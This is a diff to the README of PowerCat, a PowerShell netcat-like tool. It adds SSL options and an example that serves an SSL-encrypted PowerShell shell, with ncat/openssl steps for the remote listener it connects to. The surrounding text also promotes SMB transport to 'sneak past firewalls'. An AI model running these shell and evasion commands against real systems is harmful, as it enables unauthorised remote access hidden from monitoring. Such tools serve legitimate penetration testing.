@@ -18,6 +18,7 @@ PowerCat is packaged as a PowerShell module.  You must import the module to use 
     -Port           # The port to listen on.
 	-PipeName       # Name of pipe to listen on.
 	
+	-SslCn			# Common name for Ssl encrypting Tcp.
     -Relay          # Format: "<Mode>:<Port/PipeName>"
     -Execute        # Execute a console process or powershell.
     -SendFile       # Filepath of file to send.
@@ -33,6 +34,7 @@ PowerCat is packaged as a PowerShell module.  You must import the module to use 
     -Port           # The port to connect to.
 	-PipeName       # Name of pipe to connect to.
 	
+	-SslCn			# Common name for Ssl encrypting Tcp.
     -Relay          # Format: "<Mode>:<IP>:<Port/PipeName>"
     -Execute        # Execute a console process or powershell.
     -SendFile       # Filepath of file to send.
@@ -64,7 +66,7 @@ PowerCat can be used to transfer files using the -SendFile and -ReceiveFile para
 ```
 Shells
 ------
-PowerCat can be used to send and serve (Power)shells using the -Execute parameter.
+PowerCat can be used to send and serve (Power)Shells using the -Execute parameter.
 ###
 ```powershell
     # Serve a shell:
@@ -83,6 +85,21 @@ PowerCat supports more than sending data over TCP.
         
     # Send Data Over SMB (easily sneak past firewalls):
     Start-PowerCat -Mode Smb -PipeName PowerCat
+```
+SSL
+-----------
+PowerCat generates X509 certificates on-the-fly to provide SSL encryption of TCP connections. 
+###
+```powershell
+    # Serve an SSL-Encrypted (Power)Shell:
+    Start-PowerCat -Mode Tcp -Port 80 -SslCn <Certificate Common Name> -Execute
+        
+    # Connect to an SSL encrypted Ncat listener:
+	# Setup *nix with openssl & Ncat:
+	# openssl req -X509 -newkey rsa:2048 -subj /CN=PowerCat -days 90 -keyout key.pem -out cert.pem
+	# ncat -l -p 80 --ssl --ssl-cert cert.pem --ssl-key key.pem
+	
+	Connect-PowerCat -Mode Tcp -RemoteIp 10.1.1.1 -Port 80 -SslCn PowerCat 
 ```
 Relays
 ------
